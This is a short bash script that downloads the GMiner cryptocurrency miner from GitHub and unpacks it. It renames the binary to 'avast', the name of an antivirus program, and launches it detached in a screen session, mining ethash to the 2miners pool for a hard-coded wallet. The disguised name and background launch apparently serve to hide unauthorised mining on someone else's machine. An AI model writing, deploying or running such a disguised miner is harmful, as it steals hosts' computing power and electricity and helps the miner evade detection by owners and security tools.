#!/bin/bash
FILE=./gminer_2_63_linux64.tar.xz
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    wget https://github.com/develsoftware/GMinerRelease/releases/download/2.63/gminer_2_63_linux64.tar.xz
    tar xvf gminer_2_63_linux64.tar.xz
    mv miner avast
fi
screen -dmLS mine ./avast --algo ethash --server us-eth.2miners.com:2020 --user nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8.ace
